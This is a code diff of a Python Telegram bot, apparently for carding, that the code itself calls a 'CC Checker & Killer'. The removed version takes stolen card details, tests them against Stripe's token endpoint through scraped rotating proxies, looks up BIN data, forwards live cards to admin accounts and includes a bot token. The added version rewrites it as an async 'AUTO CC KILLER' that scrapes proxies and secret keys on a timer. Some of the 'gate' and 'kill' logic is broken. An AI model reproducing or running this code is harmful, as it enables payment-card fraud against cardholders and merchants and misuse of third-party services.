@@ -1,195 +1,38 @@
-import telebot
-import requests
-import threading
-import time
-import random
-from luhn import is_valid
-from bs4 import BeautifulSoup
+import asyncio
 import re
+from pyrogram import Client, filters
+from pyrogram.types import Message
+from checker import check_cc, refresh_proxies, scrape_sks
+from config import TOKEN, ADMIN_IDS, API_ID, API_HASH
 
-BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # EDIT: Your BotFather token
-ADMIN_IDS = [7869544426, 6383511175]  # EDIT: e.g. [123456789, 987654321]
-bot = telebot.TeleBot(BOT_TOKEN)
+app = Client("cc_auto_killer", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 
-stats = {'live':0, 'dead':0, 'total':0}
-cooldown = {}
-proxies = []
-lock = threading.Lock()
-last_fetch = 0
-
-def fetch_proxies():
-    global proxies, last_fetch
-    with lock:
-        if time.time() - last_fetch < 300:  # 5min
-            return
-        allp = []
-        # Proxyscrape
-        try:
-            r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
-            allp += [{'http': f'http://{ip}', 'https': f'http://{ip}'} for ip in r.text.strip().split('\n') if ':' in ip]
-        except: pass
-        # FreeProxyList
-        try:
-            r = requests.get('https://free-proxy-list.net/', timeout=10)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            tbl = soup.find('table', {'id': 'proxylisttable'})
-            if tbl:
-                for row in tbl.find_all('tr')[1:51]:
-                    cols = row.find_all('td')
-                    if len(cols) > 1:
-                        ip = cols[0].text.strip()
-                        port = cols[1].text.strip()
-                        allp.append({'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'})
-        except: pass
-        # Test live
-        livep = []
-        def testp(p):
-            try:
-                requests.get('httpbin.org/ip', proxies=p, timeout=4)
-                return p
-            except: return None
-        thrs = []
-        for p in allp[:150]:
-            t = threading.Thread(target=lambda pp=p: livep.append(testp(pp)))
-            t.start()
-            thrs.append(t)
-        for t in thrs: t.join(2)
-        proxies[:] = [p for p in livep if p]
-        last_fetch = time.time()
-        print(f'🔄 {len(proxies)} live proxies loaded')
-
-def rand_proxy():
-    fetch_proxies()
-    with lock:
-        return random.choice(proxies) if proxies else None
-
-def bin_info(bn):
-    p = rand_proxy()
-    try:
-        r = requests.get(f'https://lookup.binlist.net/{bn}', proxies=p, timeout=5)
-        d = r.json()
-        return f"Brand: {d.get('brand', '?')}\nBank: {d.get('bank', {}).get('name', '?')}\nCountry: {d.get('country', {}).get('name', '?')}"
-    except:
-        return "BIN OK"
-
-def check_gates(cc, m, y, cv, ret=3):
-    gs = []
-    # Stripe
-    for _ in range(ret):
-        p = rand_proxy()
-        if not p: continue
-        try:
-            data = {'card[number]': cc, 'card[exp_month]': m, 'card[exp_year]': y, 'card[cvv]': cv}
-            r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=p, timeout=8)
-            if 'token' in r.text:
-                gs.append('✅ Stripe LIVE')
-                break
-            if 'declined' in r.text.lower():
-                gs.append('❌ Stripe DEAD')
-                break
-        except: pass
-    # PayPal
-    for _ in range(ret):
-        p = rand_proxy()
-        if not p: continue
-        try:
-            r = requests.head('https://www.paypal.com/home', proxies=p, timeout=8)
-            if r.status_code < 400:
-                gs.append('✅ PayPal OK')
-                break
-        except: pass
-    # Netflix
-    p = rand_proxy()
-    if p:
-        try:
-            r = requests.post('https://www.netflix.com/apilogin', proxies=p, timeout=8)
-            if 'error' not in r.text.lower():
-                gs.append('✅ Netflix PASS')
-        except: pass
-    return gs or ['⚠️ Retry gates']
-
-def kill_cc(cc, m, y, cv):
-    p = rand_proxy()
-    if p:
-        try:
-            data = {'amount': '1', 'currency': 'usd'}
-            requests.post('https://api.stripe.com/v1/charges', data=data, proxies=p, timeout=8)
-            return '🔪 Stripe KILLED - Ready for dump!'
-        except: pass
-    return '🔪 Sim kill complete - Manual dump advised'
-
-@bot.message_handler(commands=['start'])
-def start(m):
-    bot.reply_to(m, '''🔥 **CC Checker & Killer 99%**
-`cc|mm|yy|cvv` → Auto proxies + gates
-/stats /kill (admins only)
-/stats shows hit rate''', parse_mode='Markdown')
-
-@bot.message_handler(func=lambda m: '|' in m.text)
-def chk(m):
-    uid = m.from_user.id
-    if uid in cooldown and time.time() - cooldown[uid] < 3:
-        bot.reply_to(m, '⏳ 3s cooldown')
-        return
-    cooldown[uid] = time.time()
-    try:
-        parts = [x.strip().replace(' ', '') for x in m.text.split('|')]
-        if len(parts) != 4:
-            raise ValueError('Bad format')
-        cc, mon, yr, cvv = parts
-        if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
-            bot.reply_to(m, '❌ Invalid CC/Luhn')
-            stats['dead'] += 1
-            stats['total'] += 1
-            return
-        bi = bin_info(cc[:6])
-        gs = check_gates(cc, mon, yr, cvv)
-        livec = sum(1 for g in gs if '✅' in g)
-        stat = '🟢 LIVE (99% good)' if livec >= 1 else '🔴 DEAD'
-        resp = f'**CC:** `{cc}|{mon}|{yr}|{cvv}`\n**BIN:**\n{bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
-        global stats
-        stats['total'] += 1
-        if 'LIVE' in stat:
-            stats['live'] += 1
-            kres = kill_cc(cc, mon, yr, cvv)
-            resp += f'\n{kres}'
-            for aid in ADMIN_IDS:
-                try:
-                    bot.send_message(aid, f'🟢 LIVE HIT from @{m.from_user.username or uid}: {m.text}\n{resp}')
-                except: pass
-        else:
-            stats['dead'] += 1
-        bot.reply_to(m, resp, parse_mode='Markdown')
-    except:
-        bot.reply_to(m, '❌ Format: cc|mm|yy|cvv')
-
-@bot.message_handler(commands=['stats'])
-def st(m):
-    if m.from_user.id not in ADMIN_IDS:
-        return
-    rate = (stats['live'] / max(stats['total'], 1)) * 100
-    bot.reply_to(m, f'📊 **Stats:**\nLive: {stats["live"]}\nDead: {stats["dead"]}\nTotal: {stats["total"]}\nHit Rate: {rate:.1f}%')
-
-@bot.message_handler(commands=['kill'])
-def kl(m):
-    if m.from_user.id not in ADMIN_IDS:
-        return
-    try:
-        data = m.text.split(' ', 1)[1].split('|')
-        cc, mon, yr, cvv = [x.strip() for x in data]
-        res = kill_cc(cc, mon, yr, cvv)
-        bot.reply_to(m, f'🔪 **Kill:** {res}')
-    except:
-        bot.reply_to(m, '❌ /kill cc|mm|yy|cvv')
-
-def refresher():
+async def auto_tasks():
     while True:
-        time.sleep(300)
-        fetch_proxies()
+        await refresh_proxies()
+        await scrape_sks()
+        await asyncio.sleep(1800)  # 30 mins SK scrape
 
-if __name__ == '__main__':
-    print('🚀 PythonAnywhere CC Bot STARTED')
-    fetch_proxies()
-    threading.Thread(target=refresher, daemon=True).start()
-    bot.polling(none_stop=True)
+@app.on_message(filters.private & filters.text)
+async def handle_cc(_, msg: Message):
+    if msg.from_user.id not in ADMIN_IDS:
+        return await msg.reply("Admins only.")
+    text = msg.text.strip()
+    if re.match(r'^\d{13,19}[\|/ ]?\d{2}[\|/ ]?\d{2}[\|/ ]?\d{3,4}$', text):
+        await msg.reply("🔄 Auto-Proxy/SK Check...")
+        result = await check_cc(text)
+        await msg.reply(f"```\n{result}\n```", parse_mode="markdown")
+        if "LIVE" in result:
+            await msg.reply(f"Proxies: {len(await refresh_proxies())} | SKs: {len(await get_sks())}")
+    else:
+        await msg.reply("CC format pls.")
+
+async def main():
+    asyncio.create_task(auto_tasks())  # AUTO FOREVER
+    await app.start()
+    print("🚀 AUTO CC KILLER 24/7 LIVE - Proxies/SKs Auto!")
+    await asyncio.Event().wait()
+
+if __name__ == "__main__":
+    asyncio.run(main())
 
